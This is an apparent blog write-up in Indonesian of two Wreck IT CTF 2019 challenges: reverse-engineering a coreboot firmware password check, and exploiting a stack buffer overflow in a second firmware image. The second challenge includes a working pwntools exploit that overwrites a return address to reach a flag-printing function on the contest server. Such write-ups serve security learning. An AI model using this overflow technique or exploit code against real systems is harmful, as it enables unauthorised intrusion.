<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width"><title>Wreck IT CTF 2019 Writeup | circleous</title><link rel=stylesheet href=/css/main.min.480e0ef6c6aac53eaf38419259058419b9323d67397f61cf2d8ce892d869c560.css integrity="sha256-SA4O9saqxT6vOEGSWQWEGbkyPWc5f2HPLYzokthpxWA=" crossorigin=anonymous><link rel=stylesheet href=/css/codes.min.212a1080bdb9f68724a4aff8ef71b5bf08e662a8f5ef70b13d4d94330d804899.css integrity="sha256-ISoQgL259ockpK/473G1vwjmYqj173CxPU2UMw2ASJk=" crossorigin=anonymous></head><body><header><h1><a href=/>circleous</a></h1><nav><ul><li><a href=/>Home</a></li><li><a aria-current=true class=ancestor href=/posts/>Posts</a></li><li><a href=/tags/>Tags</a></li></ul></nav></header><main><article><header><h1>Wreck IT CTF 2019 Writeup</h1><time datetime=2019-09-29T00:00:00+07:00>September 29, 2019</time></header><h1 id=1ot>1ot</h1><blockquote><p>Setelah galau dengan permasalahan UEFI-nya, kini Bambang beralih mempergunakan sistim perangkat kokoh lainnya yang dirasa lebih mudah. Namun naga-naganya, sistim perangkat kokoh tersebut terproteksi dengan password juga. Bantu Bambang menemukan jawaban. ;)</p></blockquote><p>Sedikit recon pada file yang diberikan dengan membaca headernya dan analisa strings</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>$ head -c <span style=color:#e0af68>32</span> ./1ot.bin | xxd
</span></span><span style=display:flex><span>00000000: 5f5f 464d <span style=color:#e0af68>4150</span> 5f5f <span style=color:#e0af68>0101</span> <span style=color:#e0af68>0000</span> c0ff <span style=color:#e0af68>0000</span>  __FMAP__........
</span></span><span style=display:flex><span>00000010: <span style=color:#e0af68>0000</span> <span style=color:#e0af68>0000</span> <span style=color:#e0af68>4000</span> 464c <span style=color:#e0af68>4153</span> <span style=color:#e0af68>4800</span> <span style=color:#e0af68>0000</span> <span style=color:#e0af68>0000</span>  <span style=color:#9ece6a;font-weight:700>[</span>emailÂ protected<span style=color:#9ece6a;font-weight:700>]</span>.....
</span></span><span style=display:flex><span>$ strings ./1ot.bin
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>CBFS: Locating <span style=color:#9ece6a>&#39;%s&#39;</span>
</span></span><span style=display:flex><span>CBFS: Found @ offset %zx size %zx
</span></span><span style=display:flex><span>CBFS: <span style=color:#9ece6a>&#39;%s&#39;</span> not found.
</span></span><span style=display:flex><span>coreboot-%s%s %s romstage starting <span style=color:#9ece6a;font-weight:700>(</span>log level: %i<span style=color:#9ece6a;font-weight:700>)</span>...
</span></span><span style=display:flex><span>0123456789abcdef
</span></span><span style=display:flex><span>0123456789ABCDEF
</span></span><span style=display:flex><span>...
</span></span></code></pre></div><p>dengan google-fu, <code>FMAP</code> ini ternyata flashmap files, &ldquo;flashmap, a firmware layout description format allowing to have multipleCBFSes&rdquo;. dan ada string <code>coreboot</code>, OSS project untuk firmware bios. Untuk extract file bios ini, saya mengikuti langkah-langkah dari <a href=https://www.chromium.org/chromium-os/developer-information-for-chrome-os-devices/samsung-sandy-bridge/coreboot-vmx-hack#TOC-Extracting-The-BIOS>Hacking VMX Support Into Coreboot#Extracting The BIOS</a>.</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>$ cbfstool 1ot.bin print
</span></span><span style=display:flex><span>FMAP REGION: COREBOOT
</span></span><span style=display:flex><span>Name                           Offset     Type           Size   Comp
</span></span><span style=display:flex><span>cbfs master header             0x0        cbfs header        <span style=color:#e0af68>32</span> none
</span></span><span style=display:flex><span>fallback/romstage              0x80       stage           <span style=color:#e0af68>11388</span> none
</span></span><span style=display:flex><span>fallback/ramstage              0x2d80     stage           <span style=color:#e0af68>44959</span> none
</span></span><span style=display:flex><span>config                         0xdd80     raw               <span style=color:#e0af68>485</span> none
</span></span><span style=display:flex><span>revision                       0xdfc0     raw               <span style=color:#e0af68>674</span> none
</span></span><span style=display:flex><span>cmos_layout.bin                0xe2c0     cmos_layout       <span style=color:#e0af68>548</span> none
</span></span><span style=display:flex><span>fallback/postcar               0xe540     stage            <span style=color:#e0af68>9192</span> none
</span></span><span style=display:flex><span>fallback/dsdt.aml              0x10980    raw              <span style=color:#e0af68>4021</span> none
</span></span><span style=display:flex><span>fallback/payload               0x11980    simple elf      <span style=color:#e0af68>21566</span> none
</span></span><span style=display:flex><span><span style=color:#9ece6a;font-weight:700>(</span>empty<span style=color:#9ece6a;font-weight:700>)</span>                        0x16e00    null          <span style=color:#e0af68>4083608</span> none
</span></span><span style=display:flex><span>bootblock                      0x3fbdc0   bootblock       <span style=color:#e0af68>16384</span> none
</span></span><span style=display:flex><span>$ cbfstool coreboot.bin extract -f payload -n fallback/payload -m x86
</span></span><span style=display:flex><span>Found file fallback/payload at 0x11980, <span style=color:#9ece6a>type</span> simple elf, compressed 21566, size <span style=color:#e0af68>21566</span>
</span></span><span style=display:flex><span>$ file payload
</span></span><span style=display:flex><span>payload: ELF 32-bit LSB executable, Intel 80386, version <span style=color:#e0af68>1</span> <span style=color:#9ece6a;font-weight:700>(</span>SYSV<span style=color:#9ece6a;font-weight:700>)</span>, statically linked, stripped
</span></span></code></pre></div><p>Buka file ELF tersebut pada IDA, pada tab strings-nya (Shift+F12) terdapat string <code>password</code> <img src=wreckit-iot-strings.png alt=strings> Cari xref-nya untuk string tersebut, <img src=wreckit-iot-pwdxref.png alt=strings> berikut hasil dekompilasi dari <code>sub_4002571</code></p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#41a6b5>void</span> <span style=color:#bb9af7>__cdecl</span> __noreturn <span style=color:#7aa2f7>sub_4002571</span>(<span style=color:#41a6b5>int</span> a1) {
</span></span><span style=display:flex><span>  <span style=color:#7aa2f7>maybe_printf_4003CF0</span>(<span style=color:#9ece6a>&#34;Password : &#34;</span>);
</span></span><span style=display:flex><span>  <span style=color:#7aa2f7>qmemcpy</span>(v8, flag_const_4007E20, <span style=color:#e0af68>0x33u</span>);
</span></span><span style=display:flex><span>  input <span style=color:#9ece6a;font-weight:700>=</span> (<span style=color:#41a6b5>char</span> <span style=color:#9ece6a;font-weight:700>*</span>)<span style=color:#7aa2f7>maybe_alloc_4002F62</span>(<span style=color:#e0af68>480</span>);
</span></span><span style=display:flex><span>  check <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>0</span>;
</span></span><span style=display:flex><span>  <span style=color:#bb9af7>for</span> ( i <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>0</span>; i <span style=color:#9ece6a;font-weight:700>&lt;</span> <span style=color:#e0af68>0x33</span> <span style=color:#9ece6a;font-weight:700>&amp;&amp;</span> input[i] <span style=color:#9ece6a;font-weight:700>==</span> <span style=color:#e0af68>13</span>; <span style=color:#9ece6a;font-weight:700>++</span>i ) {
</span></span><span style=display:flex><span>    input[i] <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#7aa2f7>maybe_input_4003E63</span>();
</span></span><span style=display:flex><span>    xor <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#7aa2f7>gen_key_4004AAF</span>() <span style=color:#9ece6a;font-weight:700>%</span> <span style=color:#e0af68>256</span> <span style=color:#9ece6a;font-weight:700>^</span> input[i];
</span></span><span style=display:flex><span>    <span style=color:#7aa2f7>maybe_printf_4003CF0</span>(<span style=color:#9ece6a>&#34;%c&#34;</span>, input[i]);
</span></span><span style=display:flex><span>    <span style=color:#bb9af7>if</span> ( xor <span style=color:#9ece6a;font-weight:700>!=</span> flag_const_4007E20[i] <span style=color:#9ece6a;font-weight:700>||</span> i <span style=color:#9ece6a;font-weight:700>&gt;</span> <span style=color:#e0af68>21</span> )
</span></span><span style=display:flex><span>      check <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>1</span>;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#bb9af7>if</span> ( check )
</span></span><span style=display:flex><span>    msg <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#9ece6a>&#34;</span><span style=color:#7aa2f7>\n\n</span><span style=color:#9ece6a>Nope..!&#34;</span>;
</span></span><span style=display:flex><span>  <span style=color:#bb9af7>else</span>
</span></span><span style=display:flex><span>    msg <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#9ece6a>&#34;</span><span style=color:#7aa2f7>\n\n</span><span style=color:#9ece6a>Betul, 100! itu flagnya ;)&#34;</span>;
</span></span><span style=display:flex><span>  <span style=color:#7aa2f7>maybe_printf_4003CF0</span>(msg);
</span></span><span style=display:flex><span>  <span style=color:#7aa2f7>halt_40000A0</span>();
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Logika pengecekan password sudah jelas, input dicek dengan <code>flag_const_...[] ^ gen_key()</code>. Kalau begitu tinggal buat solvernya,</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#414868;font-style:italic>#include</span> <span style=color:#414868;font-weight:700;font-style:italic>&lt;stdio.h&gt;</span><span style=color:#414868;font-style:italic>
</span></span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#41a6b5>int</span> seed <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>1</span>;
</span></span><span style=display:flex><span><span style=color:#41a6b5>unsigned</span> <span style=color:#41a6b5>char</span> flag[] <span style=color:#9ece6a;font-weight:700>=</span> { <span style=color:#414868;font-style:italic>// from flag_const_4007E20
</span></span></span><span style=display:flex><span>    <span style=color:#e0af68>0xD4</span>, <span style=color:#e0af68>0xD4</span>, <span style=color:#e0af68>0xE0</span>, <span style=color:#e0af68>0x68</span>, <span style=color:#e0af68>0x60</span>, <span style=color:#e0af68>0xED</span>, <span style=color:#e0af68>0x46</span>, <span style=color:#e0af68>0x4B</span>, <span style=color:#e0af68>0x11</span>, <span style=color:#e0af68>0x92</span>,
</span></span><span style=display:flex><span>    <span style=color:#e0af68>0x4F</span>, <span style=color:#e0af68>0xC5</span>, <span style=color:#e0af68>0xF8</span>, <span style=color:#e0af68>0xC8</span>, <span style=color:#e0af68>0x7A</span>, <span style=color:#e0af68>0x3E</span>, <span style=color:#e0af68>0x66</span>, <span style=color:#e0af68>0xB8</span>, <span style=color:#e0af68>0xAB</span>, <span style=color:#e0af68>0xF9</span>,
</span></span><span style=display:flex><span>    <span style=color:#e0af68>0xEF</span>, <span style=color:#e0af68>0x00</span>, <span style=color:#e0af68>0x00</span>, <span style=color:#e0af68>0x00</span>, <span style=color:#e0af68>0x00</span>, <span style=color:#e0af68>0xD4</span>, <span style=color:#e0af68>0xD4</span>, <span style=color:#e0af68>0xE0</span>, <span style=color:#e0af68>0x68</span>, <span style=color:#e0af68>0x60</span>,
</span></span><span style=display:flex><span>    <span style=color:#e0af68>0xED</span>, <span style=color:#e0af68>0x46</span>, <span style=color:#e0af68>0x4B</span>, <span style=color:#e0af68>0x11</span>, <span style=color:#e0af68>0x92</span>, <span style=color:#e0af68>0x4F</span>, <span style=color:#e0af68>0xC5</span>, <span style=color:#e0af68>0xF8</span>, <span style=color:#e0af68>0xC8</span>, <span style=color:#e0af68>0x7A</span>,
</span></span><span style=display:flex><span>    <span style=color:#e0af68>0x3E</span>, <span style=color:#e0af68>0x66</span>, <span style=color:#e0af68>0xB8</span>, <span style=color:#e0af68>0xAB</span>, <span style=color:#e0af68>0xF9</span>, <span style=color:#e0af68>0xEF</span>, <span style=color:#e0af68>0x00</span>, <span style=color:#e0af68>0x00</span>, <span style=color:#e0af68>0x00</span>, <span style=color:#e0af68>0x00</span>,
</span></span><span style=display:flex><span>    <span style=color:#e0af68>0x00</span>
</span></span><span style=display:flex><span>};
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#41a6b5>int</span> <span style=color:#7aa2f7>gen_key</span>(<span style=color:#41a6b5>int</span> <span style=color:#9ece6a;font-weight:700>*</span>seed) {
</span></span><span style=display:flex><span>  <span style=color:#9ece6a;font-weight:700>*</span>seed <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>0x41C64E6D</span> <span style=color:#9ece6a;font-weight:700>*</span> <span style=color:#9ece6a;font-weight:700>*</span>seed <span style=color:#9ece6a;font-weight:700>+</span> <span style=color:#e0af68>0x3039</span>;
</span></span><span style=display:flex><span>  <span style=color:#bb9af7>return</span> <span style=color:#9ece6a;font-weight:700>*</span>seed;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#41a6b5>int</span> <span style=color:#7aa2f7>main</span>(<span style=color:#41a6b5>int</span> argc, <span style=color:#41a6b5>char</span> <span style=color:#bb9af7>const</span> <span style=color:#9ece6a;font-weight:700>*</span>argv[]) {
</span></span><span style=display:flex><span>  <span style=color:#bb9af7>for</span> (<span style=color:#41a6b5>int</span> i <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>0</span>; i <span style=color:#9ece6a;font-weight:700>&lt;</span> <span style=color:#e0af68>20</span>; <span style=color:#9ece6a;font-weight:700>++</span>i) <span style=color:#7aa2f7>printf</span>(<span style=color:#9ece6a>&#34;%c&#34;</span>, flag[i] <span style=color:#9ece6a;font-weight:700>^</span> (<span style=color:#7aa2f7>gen_key</span>(<span style=color:#9ece6a;font-weight:700>&amp;</span>seed) <span style=color:#9ece6a;font-weight:700>%</span> <span style=color:#e0af68>256</span>));
</span></span><span style=display:flex><span>  <span style=color:#bb9af7>return</span> <span style=color:#e0af68>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Flag: <code>wreck{r3tURnFroMc0r3bO0ooT}</code></p><h1 id=checkm8>checkm8</h1><blockquote><p>Masih ingat dengan Bambang si tukang pencari password?Ternyata Bambang adalah agen telik sandi, Kali ini bambang ditugaskan untuk melakukan penetrasi terhadap jaringan DoD untuk menguak rahasia Area404. Melalui proses recon yang cukup panjang, akhirnya bambang berhasil mendapatkan perangkat lunak yg sama, yang digunakan pada sistim target. Bantu bambang, menemukan celah dan mengeksploitasi perangkat lunak tersebut. sasaran Bambang yang kami ketahui berada pada: checkm8.wreck-it.seclab.id:1337</p></blockquote><p>Masih sama dengan <code>1ot</code>, file &lsquo;iBoot.rom&rsquo; ini adalah coreboot BIOS, bedanya kali ini harus melakukan binary exploitation pada firmware ini. Berikut hasil dekompilasi fungsi cek password,</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#41a6b5>int</span> <span style=color:#7aa2f7>sub_53C262</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#41a6b5>int</span> v0; <span style=color:#414868;font-style:italic>// edi
</span></span></span><span style=display:flex><span>  _BYTE <span style=color:#9ece6a;font-weight:700>*</span>v1; <span style=color:#414868;font-style:italic>// ebx
</span></span></span><span style=display:flex><span>  <span style=color:#41a6b5>int</span> v2; <span style=color:#414868;font-style:italic>// ST1C_4
</span></span></span><span style=display:flex><span>  <span style=color:#41a6b5>int</span> v3; <span style=color:#414868;font-style:italic>// edx
</span></span></span><span style=display:flex><span>  <span style=color:#41a6b5>char</span> v5; <span style=color:#414868;font-style:italic>// [esp+24h] [ebp-20h]
</span></span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#7aa2f7>maybe_printf_53FCD5</span>(<span style=color:#9ece6a>&#34;Password : &#34;</span>);
</span></span><span style=display:flex><span>  v0 <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#7aa2f7>maybe_alloc_53F166</span>(<span style=color:#e0af68>256</span>, <span style=color:#e0af68>4</span>);
</span></span><span style=display:flex><span>  v1 <span style=color:#9ece6a;font-weight:700>=</span> (_BYTE <span style=color:#9ece6a;font-weight:700>*</span>)v0;
</span></span><span style=display:flex><span>  <span style=color:#bb9af7>do</span>
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    v2 <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#7aa2f7>gen_key_540A94</span>();
</span></span><span style=display:flex><span>    v3 <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#7aa2f7>maybe_input_53FE48</span>() <span style=color:#9ece6a;font-weight:700>^</span> v2 <span style=color:#9ece6a;font-weight:700>%</span> <span style=color:#e0af68>256</span>;
</span></span><span style=display:flex><span>    <span style=color:#9ece6a;font-weight:700>*</span>v1<span style=color:#9ece6a;font-weight:700>++</span> <span style=color:#9ece6a;font-weight:700>=</span> v3;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#bb9af7>while</span> ( (_BYTE)v3 <span style=color:#9ece6a;font-weight:700>!=</span> <span style=color:#e0af68>13</span> );
</span></span><span style=display:flex><span>  <span style=color:#7aa2f7>strcpy_54002D</span>((<span style=color:#41a6b5>int</span>)<span style=color:#9ece6a;font-weight:700>&amp;</span>v5, v0);
</span></span><span style=display:flex><span>  <span style=color:#bb9af7>if</span> ( <span style=color:#9ece6a;font-weight:700>!</span><span style=color:#7aa2f7>strcmp_53FFA8</span>(<span style=color:#9ece6a;font-weight:700>&amp;</span>v5, <span style=color:#9ece6a;font-weight:700>&amp;</span>dword_54452C) )
</span></span><span style=display:flex><span>    <span style=color:#7aa2f7>maybe_printf_53FCD5</span>(<span style=color:#9ece6a>&#34;</span><span style=color:#7aa2f7>\n</span><span style=color:#9ece6a>err.. ;)</span><span style=color:#7aa2f7>\n</span><span style=color:#9ece6a>&#34;</span>);
</span></span><span style=display:flex><span>  <span style=color:#bb9af7>return</span> <span style=color:#e0af68>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>terdapat bufferoverflow pada <code>v0</code> karena input tidak dibatasi masksimal sebesar alokasi awal <code>v0</code>. Selanjutnya <code>v0</code> ini di copy ke <code>v5</code> dengan <code>strcpy_54002D(v5, v0)</code>. Bug ini lah yang membuat eksploitasi ini menjadi trivial karena variabel di stack ini <code>v5</code> hanya sebesar <code>0x20</code> sedangkan input <code>v0</code> yang tidak terbatas. Eksploitasi bisa dilakukan adalah mengubah saved return address ke fungsi yang mencetak flag, <code>sub_53C24E</code>.</p><p>solver,</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#414868;font-style:italic>#!/usr/bin/env python</span>
</span></span><span style=display:flex><span><span style=color:#7dcfff>from</span> <span style=color:#e0af68>pwn</span> <span style=color:#7dcfff>import</span> <span style=color:#9ece6a;font-weight:700>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>HOST <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#9ece6a>&#39;checkm8.wreck-it.seclab.id&#39;</span>
</span></span><span style=display:flex><span>PORT <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>1337</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#bb9af7>def</span> <span style=color:#7aa2f7>gen_key</span>(n):
</span></span><span style=display:flex><span>    p <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>1</span>
</span></span><span style=display:flex><span>    k <span style=color:#9ece6a;font-weight:700>=</span> [<span style=color:#e0af68>1</span>]
</span></span><span style=display:flex><span>    <span style=color:#bb9af7>for</span> i <span style=color:#9ece6a;font-weight:700>in</span> <span style=color:#9ece6a>range</span>(n):
</span></span><span style=display:flex><span>        k<span style=color:#9ece6a;font-weight:700>.</span>append((<span style=color:#e0af68>0x41C64E6D</span> <span style=color:#9ece6a;font-weight:700>*</span> k[i] <span style=color:#9ece6a;font-weight:700>+</span> <span style=color:#e0af68>0x3039</span>) <span style=color:#9ece6a;font-weight:700>%</span> <span style=color:#e0af68>256</span>)
</span></span><span style=display:flex><span>    <span style=color:#bb9af7>return</span> k[<span style=color:#e0af68>1</span>:] <span style=color:#414868;font-style:italic># delete k[0]</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#bb9af7>def</span> <span style=color:#7aa2f7>xor</span>(k, s):
</span></span><span style=display:flex><span>    f <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#9ece6a>&#39;&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#bb9af7>for</span> i <span style=color:#9ece6a;font-weight:700>in</span> <span style=color:#9ece6a>range</span>(<span style=color:#9ece6a>len</span>(s)):
</span></span><span style=display:flex><span>        f <span style=color:#9ece6a;font-weight:700>+=</span> <span style=color:#9ece6a>chr</span>(<span style=color:#9ece6a>ord</span>(s[i]) <span style=color:#9ece6a;font-weight:700>^</span> k[i <span style=color:#9ece6a;font-weight:700>%</span> <span style=color:#9ece6a>len</span>(k)])
</span></span><span style=display:flex><span>    <span style=color:#bb9af7>return</span> f
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#bb9af7>def</span> <span style=color:#7aa2f7>exploit</span>(REMOTE):
</span></span><span style=display:flex><span>    payload <span style=color:#9ece6a;font-weight:700>=</span> p32(<span style=color:#e0af68>0x1DABC153</span>) <span style=color:#414868;font-style:italic># password</span>
</span></span><span style=display:flex><span>    payload <span style=color:#9ece6a;font-weight:700>+=</span> <span style=color:#9ece6a>&#39;A&#39;</span> <span style=color:#9ece6a;font-weight:700>*</span> <span style=color:#e0af68>0x20</span>
</span></span><span style=display:flex><span>    payload <span style=color:#9ece6a;font-weight:700>+=</span> p32(<span style=color:#e0af68>0x53C24E</span>) <span style=color:#414868;font-style:italic># print_flag</span>
</span></span><span style=display:flex><span>    payload <span style=color:#9ece6a;font-weight:700>+=</span> p8(<span style=color:#e0af68>13</span>)
</span></span><span style=display:flex><span>    k <span style=color:#9ece6a;font-weight:700>=</span> gen_key(<span style=color:#9ece6a>len</span>(payload))
</span></span><span style=display:flex><span>    payload <span style=color:#9ece6a;font-weight:700>=</span> xor(k, payload)
</span></span><span style=display:flex><span>    r<span style=color:#9ece6a;font-weight:700>.</span>sendafter(<span style=color:#9ece6a>&#39; : &#39;</span>, payload)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#bb9af7>if</span> __name__ <span style=color:#9ece6a;font-weight:700>==</span> <span style=color:#9ece6a>&#39;__main__&#39;</span>:
</span></span><span style=display:flex><span>    REMOTE <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#9ece6a>len</span>(sys<span style=color:#9ece6a;font-weight:700>.</span>argv) <span style=color:#9ece6a;font-weight:700>&gt;</span> <span style=color:#e0af68>1</span>
</span></span><span style=display:flex><span>    r <span style=color:#9ece6a;font-weight:700>=</span> remote(HOST, PORT)
</span></span><span style=display:flex><span>    exploit(REMOTE)
</span></span><span style=display:flex><span>    r<span style=color:#9ece6a;font-weight:700>.</span>interactive()
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>$ python2 solve.py
</span></span><span style=display:flex><span><span style=color:#9ece6a;font-weight:700>[</span>+<span style=color:#9ece6a;font-weight:700>]</span> Opening connection to checkm8.wreck-it.seclab.id on port 1337: Done
</span></span><span style=display:flex><span><span style=color:#9ece6a;font-weight:700>[</span>*<span style=color:#9ece6a;font-weight:700>]</span> Switching to interactive mode
</span></span><span style=display:flex><span>wreck<span style=color:#9ece6a;font-weight:700>{</span>m4Yb3_w3_Shl0ud_T4lk_brO<span style=color:#9ece6a;font-weight:700>}</span>Invalid Opcode Exception
</span></span><span style=display:flex><span>Error code: n/a
</span></span><span style=display:flex><span>EIP:    0x07febfd9
</span></span><span style=display:flex><span>CS:     0x0018
</span></span><span style=display:flex><span>GS:     0x0018
</span></span><span style=display:flex><span>Dumping stack:
</span></span><span style=display:flex><span>0x58f260: <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span>
</span></span><span style=display:flex><span>0x58f240: <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span>
</span></span><span style=display:flex><span>0x58f220: <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span>
</span></span><span style=display:flex><span>0x58f200: <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span>
</span></span><span style=display:flex><span>0x58f1e0: <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span>
</span></span><span style=display:flex><span>0x58f1c0: <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span>
</span></span><span style=display:flex><span>0x58f1a0: <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span>
</span></span><span style=display:flex><span>0x58f180: <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span>
</span></span><span style=display:flex><span>0x58f160: <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span>
</span></span><span style=display:flex><span>0x58f140: <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span>
</span></span><span style=display:flex><span>0x58f120: <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span>
</span></span><span style=display:flex><span>0x58f100: <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span>
</span></span><span style=display:flex><span>0x58f0e0: <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span>
</span></span><span style=display:flex><span>0x58f0c0: <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span>
</span></span><span style=display:flex><span>0x58f0a0: <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span>
</span></span><span style=display:flex><span>0x58f080: <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> 0053c24c 07febf78 <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span> <span style=color:#e0af68>00000000</span>
